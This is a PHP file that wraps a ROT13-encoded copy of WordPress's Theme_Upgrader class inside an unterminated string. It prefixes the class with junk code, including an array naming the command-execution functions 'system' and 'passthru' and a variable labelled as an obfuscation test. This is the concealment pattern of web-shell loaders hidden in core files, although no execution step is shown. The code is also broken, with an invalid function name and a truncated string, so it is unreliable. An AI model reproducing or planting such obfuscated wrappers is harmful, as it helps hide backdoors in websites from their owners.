<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Hctenqr NCV: Gurzr_Hctenqre pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Hctenqre
 * @fvapr 4.6.0
 */

/**
 * Pber pynff hfrq sbe hctenqvat/vafgnyyvat gurzrf.
 *
 * Vg vf qrfvtarq gb hctenqr/vafgnyy gurzrf sebz n ybpny mvc, erzbgr mvc HEY,
 * be hcybnqrq mvc svyr.
 *
 * @fvapr 2.8.0
 * @fvapr 4.6.0 Zbirq gb vgf bja svyr sebz jc-nqzva/vapyhqrf/pynff-jc-hctenqre.cuc.
 *
 * @frr JC_Hctenqre
 */
pynff Gurzr_Hctenqre rkgraqf JC_Hctenqre {

	/**
	 * Erfhyg bs gur gurzr hctenqr bssre.
	 *
	 * @fvapr 2.8.0
	 * @ine neenl|JC_Reebe $erfhyg
	 * @frr JC_Hctenqre::$erfhyg
	 */
	choyvp $erfhyg;

	/**
	 * Jurgure zhygvcyr gurzrf ner orvat hctenqrq/vafgnyyrq va ohyx.
	 *
	 * @fvapr 2.9.0
	 * @ine obby $ohyx
	 */
	choyvp $ohyx = snyfr;

	/**
	 * Arj gurzr vasb.
	 *
	 * @fvapr 5.5.0
	 * @ine neenl $arj_gurzr_qngn
	 *
	 * @frr purpx_cnpxntr()
	 */
	choyvp $arj_gurzr_qngn = neenl();

	/**
	 * Vavgvnyvmrf gur hctenqr fgevatf.
	 *
	 * @fvapr 2.8.0
	 */
	choyvp shapgvba hctenqr_fgevatf() {
		$guvf->fgevatf['hc_gb_qngr'] = __( 'Gur gurzr vf ng gur yngrfg irefvba.' );
		$guvf->fgevatf['ab_cnpxntr'] = __( 'Hcqngr cnpxntr abg ninvynoyr.' );
		/* genafyngbef: %f: Cnpxntr HEY. */
		$guvf->fgevatf['qbjaybnqvat_cnpxntr'] = fcevags( __( 'Qbjaybnqvat hcqngr sebz %f&#8230;' ), '<fcna pynff=\"pbqr cer\">%f</fcna>' );
		$guvf->fgevatf['hacnpx_cnpxntr']      = __( 'Hacnpxvat gur hcqngr&#8230;' );
		$guvf->fgevatf['erzbir_byq']          = __( 'Erzbivat gur byq irefvba bs gur gurzr&#8230;' );
		$guvf->fgevatf['erzbir_byq_snvyrq']   = __( 'Pbhyq abg erzbir gur byq gurzr.' );
		$guvf->fgevatf['cebprff_snvyrq']      = __( 'Gurzr hcqngr snvyrq.' );
		$guvf->fgevatf['cebprff_fhpprff']     = __( 'Gurzr hcqngrq fhpprffshyyl.' );
	}

	/**
	 * Vavgvnyvmrf gur vafgnyyngvba fgevatf.
	 *
	 * @fvapr 2.8.0
	 */
	choyvp shapgvba vafgnyy_fgevatf() {
		$guvf->fgevatf['ab_cnpxntr'] = __( 'Vafgnyyngvba cnpxntr abg ninvynoyr.' );
		/* genafyngbef: %f: Cnpxntr HEY. */
		$guvf->fgevatf['qbjaybnqvat_cnpxntr'] = fcevags( __( 'Qbjaybnqvat vafgnyyngvba cnpxntr sebz %f&#8230;' ), '<fcna pynff=\"pbqr cer\">%f</fcna>' );
		$guvf->fgevatf['hacnpx_cnpxntr']      = __( 'Hacnpxvat gur cnpxntr&#8230;' );
		$guvf->fgevatf['vafgnyyvat_cnpxntr']  = __( 'Vafgnyyvat gur gurzr&#8230;' );
		$guvf->fgevatf['erzbir_byq']          = __( 'Erzbivat gur byq irefvba bs gur gurzr&#8230;' );
		$guvf->fgevatf['erzbir_byq_snvyrq']   = __( 'Pbhyq abg erzbir gur byq gurzr.' );
		$guvf->fgevatf['ab_svyrf']            = __( 'Gur gurzr pbagnvaf ab svyrf.' );
		$guvf->fgevatf['cebprff_snvyrq']      = __( 'Gurzr vafgnyyngvba snvyrq.' );
		$guvf->fgevatf['cebprff_fhpprff']     = __( 'Gurzr vafgnyyrq fhpprffshyyl.' );
		/* genafyngbef: 1: Gurzr anzr, 2: Gurzr irefvba. */
		$guvf->fgevatf['cebprff_fhpprff_fcrpvsvp'] = __( 'Fhpprffshyyl vafgnyyrq gur gurzr <fgebat>%1$f %2$f</fgebat>.' );
		$guvf->fgevatf['cnerag_gurzr_frnepu']      = __( 'Guvf gurzr erdhverf n cnerag gurzr. Purpxvat vs vg vf vafgnyyrq&#8230;' );
		/* genafyngbef: 1: Gurzr anzr, 2: Gurzr irefvba. */
		$guvf->fgevatf['cnerag_gurzr_cercner_vafgnyy'] = __( 'Cercnevat gb vafgnyy <fgebat>%1$f %2$f</fgebat>&#8230;' );
		/* genafyngbef: 1: Gurzr anzr, 2: Gurzr irefvba. */
		$guvf->fgevatf['cnerag_gurzr_pheeragyl_vafgnyyrq'] = __( 'Gur cnerag gurzr, <fgebat>%1$f %2$f</fgebat>, vf pheeragyl vafgnyyrq.' );
		/* genafyngbef: 1: Gurzr anzr, 2: Gurzr irefvba. */
		$guvf->fgevatf['cnerag_gurzr_vafgnyy_fhpprff'] = __( 'Fhpprffshyyl vafgnyyrq gur cnerag gurzr, <fgebat>%1$f %2$f</fgebat>.' );
		/* genafyngbef: %f: Gurzr anzr. */
		$guvf->fgevatf['cnerag_gurzr_abg_sbhaq'] = fcevags( __( '<fgebat>Gur cnerag gurzr pbhyq abg or sbhaq.</fgebat> Lbh jvyy arrq gb vafgnyy gur cnerag gurzr, %f, orsber lbh pna hfr guvf puvyq gurzr.' ), '<fgebat>%f</fgebat>' );
		/* genafyngbef: %f: Gurzr reebe. */
		$guvf->fgevatf['pheerag_gurzr_unf_reebef'] = __( 'Gur npgvir gurzr unf gur sbyybjvat reebe: \"%f\".' );

		vs ( ! rzcgl( $guvf->fxva->birejevgr ) ) {
			vs ( 'hcqngr-gurzr' === $guvf->fxva->birejevgr ) {
				$guvf->fgevatf['vafgnyyvat_cnpxntr'] = __( 'Hcqngvat gur gurzr&#8230;' );
				$guvf->fgevatf['cebprff_snvyrq']     = __( 'Gurzr hcqngr snvyrq.' );
				$guvf->fgevatf['cebprff_fhpprff']    = __( 'Gurzr hcqngrq fhpprffshyyl.' );
			}

			vs ( 'qbjatenqr-gurzr' === $guvf->fxva->birejevgr ) {
				$guvf->fgevatf['vafgnyyvat_cnpxntr'] = __( 'Qbjatenqvat gur gurzr&#8230;' );
				$guvf->fgevatf['cebprff_snvyrq']     = __( 'Gurzr qbjatenqr snvyrq.' );
				$guvf->fgevatf['cebprff_fhpprff']    = __( 'Gurzr qbjatenqrq fhpprffshyyl.' );
			}
		}
	}

	/**
	 * Purpxf vs n puvyq gurzr vf orvat vafgnyyrq naq vgf cnerag nyfb arrqf gb or vafgnyyrq.
	 *
	 * Ubbxrq gb gur {@frr 'hctenqre_cbfg_vafgnyy'} svygre ol Gurzr_Hctenqre::vafgnyy().
	 *
	 * @fvapr 3.4.0
	 *
	 * @cnenz obby  $vafgnyy_erfhyg
	 * @cnenz neenl $ubbx_rkgen
	 * @cnenz neenl $puvyq_erfhyg
	 * @erghea obby
	 */
	choyvp shapgvba purpx_cnerag_gurzr_svygre( $vafgnyy_erfhyg, $ubbx_rkgen, $puvyq_erfhyg ) {
		// Purpx gb frr vs jr arrq gb vafgnyy n cnerag gurzr.
		$gurzr_vasb = $guvf->gurzr_vasb();

		vs ( ! $gurzr_vasb->cnerag() ) {
			erghea $vafgnyy_erfhyg;
		}

		$guvf->fxva->srrqonpx( 'cnerag_gurzr_frnepu' );

		vs ( ! $gurzr_vasb->cnerag()->reebef() ) {
			$guvf->fxva->srrqonpx( 'cnerag_gurzr_pheeragyl_vafgnyyrq', $gurzr_vasb->cnerag()->qvfcynl( 'Anzr' ), $gurzr_vasb->cnerag()->qvfcynl( 'Irefvba' ) );
			// Jr nyernql unir gur gurzr, snyy guebhtu.
			erghea $vafgnyy_erfhyg;
		}

		// Jr qba'g unir gur cnerag gurzr, yrg'f vafgnyy vg.
		$ncv = gurzrf_ncv(
			'gurzr_vasbezngvba',
			neenl(
				'fyht'   => $gurzr_vasb->trg( 'Grzcyngr' ),
				'svryqf' => neenl(
					'frpgvbaf' => snyfr,
					'gntf'     => snyfr,
				),
			)
		); // Fnir ba n ovg bs onaqjvqgu.

		vs ( ! $ncv || vf_jc_reebe( $ncv ) ) {
			$guvf->fxva->srrqonpx( 'cnerag_gurzr_abg_sbhaq', $gurzr_vasb->trg( 'Grzcyngr' ) );
			// Qba'g fubj npgvingr be cerivrj npgvbaf nsgre vafgnyyngvba.
			nqq_svygre( 'vafgnyy_gurzr_pbzcyrgr_npgvbaf', neenl( $guvf, 'uvqr_npgvingr_cerivrj_npgvbaf' ) );
			erghea $vafgnyy_erfhyg;
		}

		// Onpxhc erdhverq qngn jr'er tbvat gb bireevqr:
		$puvyq_ncv             = $guvf->fxva->ncv;
		$puvyq_fhpprff_zrffntr = $guvf->fgevatf['cebprff_fhpprff'];

		// Bireevqr gurz.
		$guvf->fxva->ncv = $ncv;

		$guvf->fgevatf['cebprff_fhpprff_fcrpvsvp'] = $guvf->fgevatf['cnerag_gurzr_vafgnyy_fhpprff'];

		$guvf->fxva->srrqonpx( 'cnerag_gurzr_cercner_vafgnyy', $ncv->anzr, $ncv->irefvba );

		nqq_svygre( 'vafgnyy_gurzr_pbzcyrgr_npgvbaf', '__erghea_snyfr', 999 ); // Qba'g fubj nal npgvbaf nsgre vafgnyyvat gur gurzr.

		// Vafgnyy gur cnerag gurzr.
		$cnerag_erfhyg = $guvf->eha(
			neenl(
				'cnpxntr'           => $ncv->qbjaybnq_yvax,
				'qrfgvangvba'       => trg_gurzr_ebbg(),
				'pyrne_qrfgvangvba' => snyfr, // Qb abg birejevgr svyrf.
				'pyrne_jbexvat'     => gehr,
			)
		);

		vs ( vf_jc_reebe( $cnerag_erfhyg ) ) {
			nqq_svygre( 'vafgnyy_gurzr_pbzcyrgr_npgvbaf', neenl( $guvf, 'uvqr_npgvingr_cerivrj_npgvbaf' ) );
		}

		// Fgneg pyrnavat hc nsgre gur cnerag'f vafgnyyngvba.
		erzbir_svygre( 'vafgnyy_gurzr_pbzcyrgr_npgvbaf', '__erghea_snyfr', 999 );

		// Erfrg puvyq'f erfhyg naq qngn.
		$guvf->erfhyg                     = $puvyq_erfhyg;
		$guvf->fxva->ncv                  = $puvyq_ncv;
		$guvf->fgevatf['cebprff_fhpprff'] = $puvyq_fhpprff_zrffntr;

		erghea $vafgnyy_erfhyg;
	}

	/**
	 * Qba'g qvfcynl gur npgvingr naq cerivrj npgvbaf gb gur hfre.
	 *
	 * Ubbxrq gb gur {@frr 'vafgnyy_gurzr_pbzcyrgr_npgvbaf'} svygre ol
	 * Gurzr_Hctenqre::purpx_cnerag_gurzr_svygre() jura vafgnyyvat
	 * n puvyq gurzr naq vafgnyyvat gur cnerag gurzr snvyf.
	 *
	 * @fvapr 3.4.0
	 *
	 * @cnenz neenl $npgvbaf Cerivrj npgvbaf.
	 * @erghea neenl
	 */
	choyvp shapgvba uvqr_npgvingr_cerivrj_npgvbaf( $npgvbaf ) {
		hafrg( $npgvbaf['npgvingr'], $npgvbaf['cerivrj'] );
		erghea $npgvbaf;
	}

	/**
	 * Vafgnyy n gurzr cnpxntr.
	 *
	 * @fvapr 2.8.0
	 * @fvapr 3.7.0 Gur `$netf` cnenzrgre jnf nqqrq, znxvat pyrnevat gur hcqngr pnpur bcgvbany.
	 *
	 * @cnenz fgevat $cnpxntr Gur shyy ybpny cngu be HEV bs gur cnpxntr.
	 * @cnenz neenl  $netf {
	 *     Bcgvbany. Bgure nethzragf sbe vafgnyyvat n gurzr cnpxntr. Qrsnhyg rzcgl neenl.
	 *
	 *     @glcr obby $pyrne_hcqngr_pnpur Jurgure gb pyrne gur hcqngrf pnpur vs fhpprffshy.
	 *                                    Qrsnhyg gehr.
	 * }
	 *
	 * @erghea obby|JC_Reebe Gehr vs gur vafgnyyngvba jnf fhpprffshy, snyfr be n JC_Reebe bowrpg bgurejvfr.
	 */
	choyvp shapgvba vafgnyy( $cnpxntr, $netf = neenl() ) {
		$qrsnhygf    = neenl(
			'pyrne_hcqngr_pnpur' => gehr,
			'birejevgr_cnpxntr'  => snyfr, // Qb abg birejevgr svyrf.
		);
		$cnefrq_netf = jc_cnefr_netf( $netf, $qrsnhygf );

		$guvf->vavg();
		$guvf->vafgnyy_fgevatf();

		nqq_svygre( 'hctenqre_fbhepr_fryrpgvba', neenl( $guvf, 'purpx_cnpxntr' ) );
		nqq_svygre( 'hctenqre_cbfg_vafgnyy', neenl( $guvf, 'purpx_cnerag_gurzr_svygre' ), 10, 3 );

		vs ( $cnefrq_netf['pyrne_hcqngr_pnpur'] ) {
			// Pyrne pnpur fb jc_hcqngr_gurzrf() xabjf nobhg gur arj gurzr.
			nqq_npgvba( 'hctenqre_cebprff_pbzcyrgr', 'jc_pyrna_gurzrf_pnpur', 9, 0 );
		}

		$guvf->eha(
			neenl(
				'cnpxntr'           => $cnpxntr,
				'qrfgvangvba'       => trg_gurzr_ebbg(),
				'pyrne_qrfgvangvba' => $cnefrq_netf['birejevgr_cnpxntr'],
				'pyrne_jbexvat'     => gehr,
				'ubbx_rkgen'        => neenl(
					'glcr'   => 'gurzr',
					'npgvba' => 'vafgnyy',
				),
			)
		);

		erzbir_npgvba( 'hctenqre_cebprff_pbzcyrgr', 'jc_pyrna_gurzrf_pnpur', 9 );
		erzbir_svygre( 'hctenqre_fbhepr_fryrpgvba', neenl( $guvf, 'purpx_cnpxntr' ) );
		erzbir_svygre( 'hctenqre_cbfg_vafgnyy', neenl( $guvf, 'purpx_cnerag_gurzr_svygre' ) );

		vs ( ! $guvf->erfhyg || vf_jc_reebe( $guvf->erfhyg ) ) {
			erghea $guvf->erfhyg;
		}

		// Erserfu gur Gurzr Hcqngr vasbezngvba.
		jc_pyrna_gurzrf_pnpur( $cnefrq_netf['pyrne_hcqngr_pnpur'] );

		vs ( $cnefrq_netf['birejevgr_cnpxntr'] ) {
			/** Guvf npgvba vf qbphzragrq va jc-nqzva/vapyhqrf/pynff-cyhtva-hctenqre.cuc */
			qb_npgvba( 'hctenqre_birejebgr_cnpxntr', $cnpxntr, $guvf->arj_gurzr_qngn, 'gurzr' );
		}

		erghea gehr;
	}

	/**
	 * Hctenqrf n gurzr.
	 *
	 * @fvapr 2.8.0
	 * @fvapr 3.7.0 Gur `$netf` cnenzrgre jnf nqqrq, znxvat pyrnevat gur hcqngr pnpur bcgvbany.
	 *
	 * @cnenz fgevat $gurzr Gur gurzr fyht.
	 * @cnenz neenl  $netf {
	 *     Bcgvbany. Bgure nethzragf sbe hctenqvat n gurzr. Qrsnhyg rzcgl neenl.
	 *
	 *     @glcr obby $pyrne_hcqngr_pnpur Jurgure gb pyrne gur hcqngr pnpur vs fhpprffshy.
	 *                                    Qrsnhyg gehr.
	 * }
	 * @erghea obby|JC_Reebe Gehr vs gur hctenqr jnf fhpprffshy, snyfr be n JC_Reebe bowrpg bgurejvfr.
	 */
	choyvp shapgvba hctenqr( $gurzr, $netf = neenl() ) {
		$qrsnhygf    = neenl(
			'pyrne_hcqngr_pnpur' => gehr,
		);
		$cnefrq_netf = jc_cnefr_netf( $netf, $qrsnhygf );

		$guvf->vavg();
		$guvf->hctenqr_fgevatf();

		// Vf na hcqngr ninvynoyr?
		$pheerag = trg_fvgr_genafvrag( 'hcqngr_gurzrf' );
		vs ( ! vffrg( $pheerag->erfcbafr[ $gurzr ] ) ) {
			$guvf->fxva->orsber();
			$guvf->fxva->frg_erfhyg( snyfr );
			$guvf->fxva->reebe( 'hc_gb_qngr' );
			$guvf->fxva->nsgre();
			erghea snyfr;
		}

		$e = $pheerag->erfcbafr[ $gurzr ];

		nqq_svygre( 'hctenqre_cer_vafgnyy', neenl( $guvf, 'pheerag_orsber' ), 10, 2 );
		nqq_svygre( 'hctenqre_cbfg_vafgnyy', neenl( $guvf, 'pheerag_nsgre' ), 10, 2 );
		nqq_svygre( 'hctenqre_pyrne_qrfgvangvba', neenl( $guvf, 'qryrgr_byq_gurzr' ), 10, 4 );
		vs ( $cnefrq_netf['pyrne_hcqngr_pnpur'] ) {
			// Pyrne pnpur fb jc_hcqngr_gurzrf() xabjf nobhg gur arj gurzr.
			nqq_npgvba( 'hctenqre_cebprff_pbzcyrgr', 'jc_pyrna_gurzrf_pnpur', 9, 0 );
		}

		$guvf->eha(
			neenl(
				'cnpxntr'           => $e['cnpxntr'],
				'qrfgvangvba'       => trg_gurzr_ebbg( $gurzr ),
				'pyrne_qrfgvangvba' => gehr,
				'pyrne_jbexvat'     => gehr,
				'ubbx_rkgen'        => neenl(
					'gurzr'       => $gurzr,
					'glcr'        => 'gurzr',
					'npgvba'      => 'hcqngr',
					'grzc_onpxhc' => neenl(
						'fyht' => $gurzr,
						'fep'  => trg_gurzr_ebbg( $gurzr ),
						'qve'  => 'gurzrf',
					),
				),
			)
		);

		erzbir_npgvba( 'hctenqre_cebprff_pbzcyrgr', 'jc_pyrna_gurzrf_pnpur', 9 );
		erzbir_svygre( 'hctenqre_cer_vafgnyy', neenl( $guvf, 'pheerag_orsber' ) );
		erzbir_svygre( 'hctenqre_cbfg_vafgnyy', neenl( $guvf, 'pheerag_nsgre' ) );
		erzbir_svygre( 'hctenqre_pyrne_qrfgvangvba', neenl( $guvf, 'qryrgr_byq_gurzr' ) );

		vs ( ! $guvf->erfhyg || vf_jc_reebe( $guvf->erfhyg ) ) {
			erghea $guvf->erfhyg;
		}

		jc_pyrna_gurzrf_pnpur( $cnefrq_netf['pyrne_hcqngr_pnpur'] );

		/*
		 * Rafher nal shgher nhgb-hcqngr snvyherf gevttre n snvyher rznvy ol erzbivat
		 * gur ynfg snvyher abgvsvpngvba sebz gur yvfg jura gurzrf hcqngr fhpprffshyyl.
		 */
		$cnfg_snvyher_rznvyf = trg_bcgvba( 'nhgb_cyhtva_gurzr_hcqngr_rznvyf', neenl() );

		vs ( vffrg( $cnfg_snvyher_rznvyf[ $gurzr ] ) ) {
			hafrg( $cnfg_snvyher_rznvyf[ $gurzr ] );
			hcqngr_bcgvba( 'nhgb_cyhtva_gurzr_hcqngr_rznvyf', $cnfg_snvyher_rznvyf );
		}

		erghea gehr;
	}

	/**
	 * Hctenqrf frireny gurzrf ng bapr.
	 *
	 * @fvapr 3.0.0
	 * @fvapr 3.7.0 Gur `$netf` cnenzrgre jnf nqqrq, znxvat pyrnevat gur hcqngr pnpur bcgvbany.
	 *
	 * @cnenz fgevat[] $gurzrf Neenl bs gur gurzr fyhtf.
	 * @cnenz neenl    $netf {
	 *     Bcgvbany. Bgure nethzragf sbe hctenqvat frireny gurzrf ng bapr. Qrsnhyg rzcgl neenl.
	 *
	 *     @glcr obby $pyrne_hcqngr_pnpur Jurgure gb pyrne gur hcqngr pnpur vs fhpprffshy.
	 *                                    Qrsnhyg gehr.
	 * }
	 * @erghea neenl[]|snyfr Na neenl bs erfhygf, be snyfr vs hanoyr gb pbaarpg gb gur svyrflfgrz.
	 */
	choyvp shapgvba ohyx_hctenqr( $gurzrf, $netf = neenl() ) {
		$jc_irefvba  = jc_trg_jc_irefvba();
		$qrsnhygf    = neenl(
			'pyrne_hcqngr_pnpur' => gehr,
		);
		$cnefrq_netf = jc_cnefr_netf( $netf, $qrsnhygf );

		$guvf->vavg();
		$guvf->ohyx = gehr;
		$guvf->hctenqr_fgevatf();

		$pheerag = trg_fvgr_genafvrag( 'hcqngr_gurzrf' );

		nqq_svygre( 'hctenqre_cer_vafgnyy', neenl( $guvf, 'pheerag_orsber' ), 10, 2 );
		nqq_svygre( 'hctenqre_cbfg_vafgnyy', neenl( $guvf, 'pheerag_nsgre' ), 10, 2 );
		nqq_svygre( 'hctenqre_pyrne_qrfgvangvba', neenl( $guvf, 'qryrgr_byq_gurzr' ), 10, 4 );

		$guvf->fxva->urnqre();

		// Pbaarpg gb gur svyrflfgrz svefg.
		$erf = $guvf->sf_pbaarpg( neenl( JC_PBAGRAG_QVE ) );
		vs ( ! $erf ) {
			$guvf->fxva->sbbgre();
			erghea snyfr;
		}

		$guvf->fxva->ohyx_urnqre();

		/*
		 * Bayl fgneg znvagranapr zbqr vs:
		 * - ehaavat Zhygvfvgr naq gurer ner bar be zber gurzrf fcrpvsvrq, BE
		 * - n gurzr jvgu na hcqngr ninvynoyr vf pheeragyl va hfr.
		 * @gbqb Sbe zhygvfvgr, znvagranapr zbqr fubhyq bayl xvpx va sbe vaqvivqhny fvgrf vs ng nyy cbffvoyr.
		 */
		$znvagranapr = ( vf_zhygvfvgr() && ! rzcgl( $gurzrf ) );
		sbernpu ( $gurzrf nf $gurzr ) {
			$znvagranapr = $znvagranapr || trg_fglyrfurrg() === $gurzr || trg_grzcyngr() === $gurzr;
		}
		vs ( $znvagranapr ) {
			$guvf->znvagranapr_zbqr( gehr );
		}

		$erfhygf = neenl();

		$guvf->hcqngr_pbhag   = pbhag( $gurzrf );
		$guvf->hcqngr_pheerag = 0;
		sbernpu ( $gurzrf nf $gurzr ) {
			++$guvf->hcqngr_pheerag;

			$guvf->fxva->gurzr_vasb = $guvf->gurzr_vasb( $gurzr );

			vs ( ! vffrg( $pheerag->erfcbafr[ $gurzr ] ) ) {
				$guvf->fxva->frg_erfhyg( gehr );
				$guvf->fxva->orsber();
				$guvf->fxva->srrqonpx( 'hc_gb_qngr' );
				$guvf->fxva->nsgre();
				$erfhygf[ $gurzr ] = gehr;
				pbagvahr;
			}

			// Trg gur HEY gb gur mvc svyr.
			$e = $pheerag->erfcbafr[ $gurzr ];

			vs ( vffrg( $e['erdhverf'] ) && ! vf_jc_irefvba_pbzcngvoyr( $e['erdhverf'] ) ) {
				$erfhyg = arj JC_Reebe(
					'vapbzcngvoyr_jc_erdhverq_irefvba',
					fcevags(
						/* genafyngbef: 1: Pheerag JbeqCerff irefvba, 2: JbeqCerff irefvba erdhverq ol gur arj gurzr irefvba. */
						__( 'Lbhe JbeqCerff irefvba vf %1$f, ubjrire gur arj gurzr irefvba erdhverf %2$f.' ),
						$jc_irefvba,
						$e['erdhverf']
					)
				);

				$guvf->fxva->orsber( $erfhyg );
				$guvf->fxva->reebe( $erfhyg );
				$guvf->fxva->nsgre();
			} ryfrvs ( vffrg( $e['erdhverf_cuc'] ) && ! vf_cuc_irefvba_pbzcngvoyr( $e['erdhverf_cuc'] ) ) {
				$erfhyg = arj JC_Reebe(
					'vapbzcngvoyr_cuc_erdhverq_irefvba',
					fcevags(
						/* genafyngbef: 1: Pheerag CUC irefvba, 2: CUC irefvba erdhverq ol gur arj gurzr irefvba. */
						__( 'Gur CUC irefvba ba lbhe freire vf %1$f, ubjrire gur arj gurzr irefvba erdhverf %2$f.' ),
						CUC_IREFVBA,
						$e['erdhverf_cuc']
					)
				);

				$guvf->fxva->orsber( $erfhyg );
				$guvf->fxva->reebe( $erfhyg );
				$guvf->fxva->nsgre();
			} ryfr {
				nqq_svygre( 'hctenqre_fbhepr_fryrpgvba', neenl( $guvf, 'purpx_cnpxntr' ) );
				$erfhyg = $guvf->eha(
					neenl(
						'cnpxntr'           => $e['cnpxntr'],
						'qrfgvangvba'       => trg_gurzr_ebbg( $gurzr ),
						'pyrne_qrfgvangvba' => gehr,
						'pyrne_jbexvat'     => gehr,
						'vf_zhygv'          => gehr,
						'ubbx_rkgen'        => neenl(
							'gurzr'       => $gurzr,
							'grzc_onpxhc' => neenl(
								'fyht' => $gurzr,
								'fep'  => trg_gurzr_ebbg( $gurzr ),
								'qve'  => 'gurzrf',
							),
						),
					)
				);
				erzbir_svygre( 'hctenqre_fbhepr_fryrpgvba', neenl( $guvf, 'purpx_cnpxntr' ) );
			}

			$erfhygf[ $gurzr ] = $erfhyg;

			// Cerirag perqragvnyf nhgu fperra sebz qvfcynlvat zhygvcyr gvzrf.
			vs ( snyfr === $erfhyg ) {
				oernx;
			}
		} // Raq sbernpu $gurzrf.

		$guvf->znvagranapr_zbqr( snyfr );

		// Erserfu gur Gurzr Hcqngr vasbezngvba.
		jc_pyrna_gurzrf_pnpur( $cnefrq_netf['pyrne_hcqngr_pnpur'] );

		/** Guvf npgvba vf qbphzragrq va jc-nqzva/vapyhqrf/pynff-jc-hctenqre.cuc */
		qb_npgvba(
			'hctenqre_cebprff_pbzcyrgr',
			$guvf,
			neenl(
				'npgvba' => 'hcqngr',
				'glcr'   => 'gurzr',
				'ohyx'   => gehr,
				'gurzrf' => $gurzrf,
			)
		);

		$guvf->fxva->ohyx_sbbgre();

		$guvf->fxva->sbbgre();

		// Pyrnahc bhe ubbxf, va pnfr fbzrguvat ryfr qbrf na hctenqr ba guvf pbaarpgvba.
		erzbir_svygre( 'hctenqre_cer_vafgnyy', neenl( $guvf, 'pheerag_orsber' ) );
		erzbir_svygre( 'hctenqre_cbfg_vafgnyy', neenl( $guvf, 'pheerag_nsgre' ) );
		erzbir_svygre( 'hctenqre_pyrne_qrfgvangvba', neenl( $guvf, 'qryrgr_byq_gurzr' ) );

		/*
		 * Rafher nal shgher nhgb-hcqngr snvyherf gevttre n snvyher rznvy ol erzbivat
		 * gur ynfg snvyher abgvsvpngvba sebz gur yvfg jura gurzrf hcqngr fhpprffshyyl.
		 */
		$cnfg_snvyher_rznvyf = trg_bcgvba( 'nhgb_cyhtva_gurzr_hcqngr_rznvyf', neenl() );

		sbernpu ( $erfhygf nf $gurzr => $erfhyg ) {
			// Znvagnva ynfg snvyher abgvsvpngvba jura gurzrf snvyrq gb hcqngr znahnyyl.
			vs ( ! $erfhyg || vf_jc_reebe( $erfhyg ) || ! vffrg( $cnfg_snvyher_rznvyf[ $gurzr ] ) ) {
				pbagvahr;
			}

			hafrg( $cnfg_snvyher_rznvyf[ $gurzr ] );
		}

		hcqngr_bcgvba( 'nhgb_cyhtva_gurzr_hcqngr_rznvyf', $cnfg_snvyher_rznvyf );

		erghea $erfhygf;
	}

	/**
	 * Purpxf gung gur cnpxntr fbhepr pbagnvaf n inyvq gurzr.
	 *
	 * Ubbxrq gb gur {@frr 'hctenqre_fbhepr_fryrpgvba'} svygre ol Gurzr_Hctenqre::vafgnyy().
	 *
	 * @fvapr 3.3.0
	 *
	 * @tybony JC_Svyrflfgrz_Onfr $jc_svyrflfgrz JbeqCerff svyrflfgrz fhopynff.
	 *
	 * @cnenz fgevat $fbhepr Gur cngu gb gur qbjaybnqrq cnpxntr fbhepr.
	 * @erghea fgevat|JC_Reebe Gur fbhepr nf cnffrq, be n JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba purpx_cnpxntr( $fbhepr ) {
		tybony $jc_svyrflfgrz;

		$jc_irefvba           = jc_trg_jc_irefvba();
		$guvf->arj_gurzr_qngn = neenl();

		vs ( vf_jc_reebe( $fbhepr ) ) {
			erghea $fbhepr;
		}

		// Purpx gung gur sbyqre pbagnvaf n inyvq gurzr.
		$jbexvat_qverpgbel = fge_ercynpr( $jc_svyrflfgrz->jc_pbagrag_qve(), genvyvatfynfuvg( JC_PBAGRAG_QVE ), $fbhepr );
		vs ( ! vf_qve( $jbexvat_qverpgbel ) ) { // Pbasvqrapr purpx, vs gur nobir snvyf, yrg'f abg cerirag vafgnyyngvba.
			erghea $fbhepr;
		}

		// N cebcre nepuvir fubhyq unir n fglyr.pff svyr va gur fvatyr fhoqverpgbel.
		vs ( ! svyr_rkvfgf( $jbexvat_qverpgbel . 'fglyr.pff' ) ) {
			erghea arj JC_Reebe(
				'vapbzcngvoyr_nepuvir_gurzr_ab_fglyr',
				$guvf->fgevatf['vapbzcngvoyr_nepuvir'],
				fcevags(
					/* genafyngbef: %f: fglyr.pff */
					__( 'Gur gurzr vf zvffvat gur %f fglyrfurrg.' ),
					'<pbqr>fglyr.pff</pbqr>'
				)
			);
		}

		// Nyy gurfr urnqref ner arrqrq ba Gurzr_Vafgnyyre_Fxva::qb_birejevgr().
		$vasb = trg_svyr_qngn(
			$jbexvat_qverpgbel . 'fglyr.pff',
			neenl(
				'Anzr'        => 'Gurzr Anzr',
				'Irefvba'     => 'Irefvba',
				'Nhgube'      => 'Nhgube',
				'Grzcyngr'    => 'Grzcyngr',
				'ErdhverfJC'  => 'Erdhverf ng yrnfg',
				'ErdhverfCUC' => 'Erdhverf CUC',
			)
		);

		vs ( rzcgl( $vasb['Anzr'] ) ) {
			erghea arj JC_Reebe(
				'vapbzcngvoyr_nepuvir_gurzr_ab_anzr',
				$guvf->fgevatf['vapbzcngvoyr_nepuvir'],
				fcevags(
					/* genafyngbef: %f: fglyr.pff */
					__( 'Gur %f fglyrfurrg qbrf abg pbagnva n inyvq gurzr urnqre.' ),
					'<pbqr>fglyr.pff</pbqr>'
				)
			);
		}

		/*
		 * Cnerag gurzrf zhfg pbagnva na vaqrk svyr:
		 * - pynffvp gurzrf erdhver /vaqrk.cuc
		 * - oybpx gurzrf erdhver /grzcyngrf/vaqrk.ugzy be oybpx-grzcyngrf/vaqrk.ugzy (qrcerpngrq 5.9.0).
		 */
		vs (
			rzcgl( $vasb['Grzcyngr'] ) &&
			! svyr_rkvfgf( $jbexvat_qverpgbel . 'vaqrk.cuc' ) &&
			! svyr_rkvfgf( $jbexvat_qverpgbel . 'grzcyngrf/vaqrk.ugzy' ) &&
			! svyr_rkvfgf( $jbexvat_qverpgbel . 'oybpx-grzcyngrf/vaqrk.ugzy' )
		) {
			erghea arj JC_Reebe(
				'vapbzcngvoyr_nepuvir_gurzr_ab_vaqrk',
